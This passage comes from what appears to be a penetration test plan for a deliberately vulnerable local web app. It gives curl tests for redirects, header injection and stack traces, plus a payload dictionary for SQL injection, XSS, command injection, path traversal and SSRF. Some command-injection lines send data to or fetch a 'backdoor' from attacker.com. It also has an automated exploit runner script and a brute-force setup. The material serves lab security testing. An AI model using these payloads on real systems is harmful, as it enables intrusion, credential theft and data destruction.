  "http://localhost:5001/api/utils/redirect?url=data:text/html,<script>alert(1)</script>"

# Double URL encoding
curl -s -o /dev/null -w "%{redirect_url}" \
  "http://localhost:5001/api/utils/redirect?url=https%3A%2F%2Fevil.com"
```

---

#### 🔴 TEST-24: HTTP Header Injection

**Simulated Data — Header Injection Payloads**:
```bash
# Basic header injection
curl -s -I "http://localhost:5001/api/utils/lang?lang=en%0d%0aX-Injected:%20true"

# Set-Cookie injection
curl -s -I "http://localhost:5001/api/utils/lang?lang=en%0d%0aSet-Cookie:%20admin=true"

# Content-Type injection
curl -s -I "http://localhost:5001/api/utils/lang?lang=en%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"

# Response splitting
curl -s -I "http://localhost:5001/api/utils/lang?lang=en%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Injected</h1>"
```

---

#### 🔴 TEST-25: Stack Trace Exposure

**Objective**: Trigger server errors to leak internal information via stack traces.

```bash
# Send invalid JSON
curl -s -X POST http://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d 'invalid json'

# Access non-existent route
curl -s http://localhost:5001/api/nonexistent

# Send unexpected data types
curl -s -X PUT http://localhost:5001/api/auth/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan_type": {"$gt": ""}}'  # NoSQL-style payload on SQL DB
```

---

## 4. Payload Dictionary

### 4.1 SQL Injection Payloads

```
' OR '1'='1
' OR '1'='1' --
' UNION SELECT 1,2,3,4,5--
' UNION SELECT id,email,password,plan_type,0 FROM users--
' UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table'--
'; DROP TABLE projects; --
' AND (SELECT count(*) FROM users) > 0 --
' ORDER BY 1--
' ORDER BY 5--
' ORDER BY 6--
```

### 4.2 XSS Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<input onfocus=alert(1) autofocus>
<a href="javascript:alert(1)">Click</a>
```

### 4.3 Command Injection Payloads

```
;id
;whoami
|id
`id`
$(id)
;cat /etc/passwd
;env
127.0.0.1;ls -la
127.0.0.1 && id
127.0.0.1 || id
;curl http://attacker.com/$(whoami)
;wget http://attacker.com -O /tmp/backdoor
```

### 4.4 Path Traversal Payloads

```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd
../server.js
../database.sqlite
../middleware/auth.js
../.env
```

### 4.5 SSRF Payloads

```
http://localhost:5001/api/debug
http://127.0.0.1:5001/api/admin?admin=true
http://[::1]:5001/api/debug
http://0.0.0.0:5001/api/debug
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/
file:///etc/passwd
dict://localhost:6379/info
gopher://localhost:6379/
```

---

## 5. Automation Scripts

### 5.1 Full Automated Pentest Script

Save as `pentest_runner.sh`:

```bash
#!/bin/bash
# VulApp Gray-Box Automated Pentest Runner
# Usage: chmod +x pentest_runner.sh && ./pentest_runner.sh

BASE_URL="http://localhost:5001"
RESULTS_FILE="pentest_results_$(date +%Y%m%d_%H%M%S).json"

echo "========================================="
echo "  VulApp Gray-Box Penetration Test"
echo "  Target: $BASE_URL"
echo "  Date: $(date)"
echo "========================================="

# Step 1: Get auth token
echo -e "\n[*] Authenticating..."
TOKEN=$(curl -s -X POST $BASE_URL/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"123456"}' | jq -r '.token')
echo "[+] Token: ${TOKEN:0:50}..."

# Step 2: Test debug exposure
echo -e "\n[TEST] Sensitive Data Exposure (/api/debug)"
DEBUG_RESULT=$(curl -s $BASE_URL/api/debug)
JWT_SECRET=$(echo $DEBUG_RESULT | jq -r '.config.jwt_secret')
echo "[VULN] JWT Secret leaked: $JWT_SECRET"

# Step 3: Test admin bypass
echo -e "\n[TEST] Admin Panel Bypass (/api/admin?admin=true)"
ADMIN_RESULT=$(curl -s "$BASE_URL/api/admin?admin=true")
USER_COUNT=$(echo $ADMIN_RESULT | jq '.total_users')
echo "[VULN] Admin panel accessible. Users found: $USER_COUNT"

# Step 4: Test SQL injection
echo -e "\n[TEST] SQL Injection (/api/projects/search/name)"
SQLI_RESULT=$(curl -s "$BASE_URL/api/projects/search/name?name=' UNION SELECT id,email,password,plan_type,0 FROM users--")
echo "[VULN] SQLi result: $SQLI_RESULT"

# Step 5: Test command injection
echo -e "\n[TEST] Command Injection (/api/utils/ping)"
RCE_RESULT=$(curl -s "$BASE_URL/api/utils/ping?host=;id")
echo "[VULN] RCE result: $(echo $RCE_RESULT | jq -r '.stdout')"

# Step 6: Test path traversal
echo -e "\n[TEST] Path Traversal (/api/files/download)"
TRAVERSAL_RESULT=$(curl -s "$BASE_URL/api/files/download?name=../../etc/passwd")
echo "[VULN] Path traversal: ${TRAVERSAL_RESULT:0:100}..."

# Step 7: Test JWT none algorithm
echo -e "\n[TEST] JWT None Algorithm Bypass"
NONE_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUuY29tIiwicGxhbiI6ImVudGVycHJpc2UifQ."
NONE_RESULT=$(curl -s -H "Authorization: Bearer $NONE_TOKEN" $BASE_URL/api/auth/profile)
echo "[VULN] None algo result: $NONE_RESULT"

# Step 8: Test SSRF
echo -e "\n[TEST] SSRF (/api/fetch-url)"
SSRF_RESULT=$(curl -s "$BASE_URL/api/fetch-url?url=http://localhost:5001/api/debug")
echo "[VULN] SSRF chain to debug: ${SSRF_RESULT:0:100}..."

# Step 9: Test prototype pollution
echo -e "\n[TEST] Prototype Pollution (/api/utils/merge)"
PROTO_RESULT=$(curl -s -X POST $BASE_URL/api/utils/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}')
echo "[VULN] Pollution check: $(echo $PROTO_RESULT | jq -r '.pollutionCheck.message')"

# Step 10: Test mass assignment
echo -e "\n[TEST] Mass Assignment (PUT /api/auth/profile)"
MASS_RESULT=$(curl -s -X PUT $BASE_URL/api/auth/profile \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"plan_type":"enterprise"}')
echo "[VULN] Mass assignment: $MASS_RESULT"

# Step 11: Test open redirect
echo -e "\n[TEST] Open Redirect (/api/utils/redirect)"
REDIRECT_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/utils/redirect?url=https://evil.com")
echo "[VULN] Redirect status: $REDIRECT_CODE (302 = vulnerable)"

echo -e "\n========================================="
echo "  Pentest Complete! Review results above."
echo "========================================="
```

### 5.2 Burp Suite Configuration

**Proxy Settings for Burp**:
```
Proxy Listener:  127.0.0.1:8080
Target Scope:    http://localhost:5001/*
Browser Config:  Set proxy to 127.0.0.1:8080

Intruder Positions (for brute-force):
  POST /api/auth/login
  Body: {"email":"test@example.com","password":"§payload§"}
  Payload: Top 1000 passwords list
```

---

## 6. Expected Evidence & Findings Report Template

### Test Result Tracker

| Test ID  | Vulnerability                | Severity   | Status     | Evidence           |
|----------|------------------------------|------------|------------|--------------------|
| TEST-01  | No Rate Limiting             | 🟠 Medium  | ☐ Pending  |                    |
| TEST-02  | JWT None Algorithm           | 🔴 Critical| ☐ Pending  |                    |
| TEST-03  | Weak JWT Secret              | 🔴 Critical| ☐ Pending  |                    |
| TEST-04  | User Enumeration             | 🟡 Low     | ☐ Pending  |                    |
| TEST-05  | Insecure Password Reset      | 🔴 Critical| ☐ Pending  |                    |
| TEST-06  | IDOR (Read)                  | 🟠 Medium  | ☐ Pending  |                    |
| TEST-07  | IDOR (Delete)                | 🔴 Critical| ☐ Pending  |                    |
| TEST-08  | IDOR (Update)                | 🟠 High    | ☐ Pending  |                    |
| TEST-09  | Admin Panel Bypass           | 🔴 Critical| ☐ Pending  |                    |
| TEST-10  | Mass Assignment              | 🔴 Critical| ☐ Pending  |                    |
| TEST-11  | SQL Injection                | 🔴 Critical| ☐ Pending  |                    |
| TEST-12  | Stored XSS                   | 🟠 High    | ☐ Pending  |                    |
| TEST-13  | Command Injection (RCE)      | 🔴 Critical| ☐ Pending  |                    |
| TEST-14  | Prototype Pollution          | 🟠 Medium  | ☐ Pending  |                    |
| TEST-15  | CSV Injection                | 🟡 Low     | ☐ Pending  |                    |
| TEST-16  | Unrestricted File Upload     | 🟠 High    | ☐ Pending  |                    |
| TEST-17  | Path Traversal               | 🔴 Critical| ☐ Pending  |                    |
| TEST-18  | Subscription Bypass          | 🟠 High    | ☐ Pending  |                    |
| TEST-19  | SSRF                         | 🔴 Critical| ☐ Pending  |                    |
| TEST-20  | Sensitive Data Exposure      | 🔴 Critical| ☐ Pending  |                    |
| TEST-21  | ReDoS                        | 🟠 Medium  | ☐ Pending  |                    |
| TEST-22  | CORS Wildcard                | 🟠 Medium  | ☐ Pending  |                    |
| TEST-23  | Open Redirect                | 🟡 Low     | ☐ Pending  |                    |
| TEST-24  | HTTP Header Injection        | 🟠 Medium  | ☐ Pending  |                    |
| TEST-25  | Stack Trace Exposure         | 🟡 Low     | ☐ Pending  |                    |

### CVSS / Risk Matrix Summary

| Severity       | Count | Category Examples                                      |
|----------------|-------|--------------------------------------------------------|
| 🔴 Critical    | 10    | RCE, SQLi, JWT bypasses, Path Traversal, SSRF          |
| 🟠 High        | 5     | XSS, IDOR (Update), File Upload, Subscription Bypass   |
| 🟠 Medium      | 5     | CORS, Prototype Pollution, ReDoS, Header Injection      |
| 🟡 Low         | 5     | User Enum, CSV Injection, Open Redirect, Stack Traces   |

---

## ⚠️ Important Notes

1. **Legal**: Only test against systems you own or have explicit authorization to test.
2. **Scope**: All tests target `localhost` (Docker containers). No external systems are attacked.
3. **Data Recovery**: After destructive tests (IDOR delete, password reset), restart containers:
   ```bash
   docker-compose down -v && docker-compose up --build
   ```
4. **Reverse Shells**: Reverse shell payloads are documented but **commented out** — do NOT use outside lab environments.
5. **ReDoS Warning**: The ReDoS test (TEST-21) can freeze the backend process. Test with short payloads first and use `--max-time` to prevent indefinite hangs.
